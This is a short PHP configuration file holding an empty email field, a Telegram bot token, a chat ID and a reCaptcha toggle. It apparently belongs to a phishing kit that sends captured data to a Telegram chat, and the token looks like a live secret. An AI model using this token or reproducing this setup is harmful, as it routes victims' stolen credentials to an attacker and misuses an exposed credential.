<?php
$email = ""; // Email
$botToken = "9261511748:AAFycT-4PuENjLByNjIHYsMl9aMu-mZH3so"; // TELEGRAM token
$chatId = "8042754563"; // chatid

$reCaptcha = 'on'; // ( on / off ) Turn reCaptcha off if u want

